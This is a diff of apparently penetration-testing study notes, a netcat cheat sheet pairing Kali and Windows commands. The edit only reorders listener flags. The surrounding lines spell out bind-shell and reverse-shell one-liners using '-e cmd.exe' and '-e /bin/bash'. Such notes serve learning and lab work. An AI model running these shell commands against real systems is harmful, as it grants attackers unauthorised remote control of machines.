@@ -48,20 +48,20 @@ Kali                    nc -nv 192.168.1.10 110
 
 - Chat
 Kali                    nc -nv 192.168.1.10 4444
-Windows                 nc.exe -nlvp 4444
+Windows                 nc.exe -lvnp 4444
 
 - Transfer a file
-Windows                 nc.exe -nlvp 4444 > wget.exe
+Windows                 nc.exe -lvnp 4444 > wget.exe
 Kali                    nc -nv 192.168.1.10 4444 < /usr/share/windows-binaries/wget.exe
 There is no output letting you know when the transfer is complete.
 
 - Bind shell
 Kali                    nc -nv 192.168.1.10 4444
-Windows                 nc.exe -nlvp 4444 -e cmd.exe
+Windows                 nc.exe -lvnp 4444 -e cmd.exe
 Kali                    You will see a Windows prompt
 
 - Reverse shell
-Windows                 nc.exe -nlvp 4444
+Windows                 nc.exe -lvnp 4444
 Kali                    nc -nv 192.168.1.10 4444 -e /bin/bash
 Windows                 You will not see a Linux prompt
 ------------------------------------------------------------------------------------------------------------------------------------------------------
